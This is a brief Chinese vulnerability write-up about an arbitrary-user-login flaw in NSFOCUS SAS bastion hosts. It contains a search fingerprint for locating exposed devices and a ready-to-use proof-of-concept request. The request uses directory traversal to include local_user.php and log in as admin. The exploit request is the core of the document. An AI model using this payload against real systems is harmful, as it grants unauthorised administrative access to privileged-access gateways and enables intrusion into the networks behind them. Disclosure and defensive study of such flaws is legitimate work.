# 绿盟 SAS堡垒机 local_user.php 任意用户登录漏洞

## 漏洞描述

绿盟堡垒机存在任意用户登录漏洞，攻击者通过漏洞包含 www/local_user.php 实现任意⽤户登录

## 漏洞影响

绿盟 SAS堡垒机

## 网络测绘

body="'/needUsbkey.php?username='"

## 漏洞复现

登陆页面

![image-20230810162438206](https://img2023.cnblogs.com/blog/2411575/202308/2411575-20230810163302640-1372323776.png)

验证POC

```plain
/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin
```

![image-20230810162350266](https://img2023.cnblogs.com/blog/2411575/202308/2411575-20230810163306280-1868187155.png)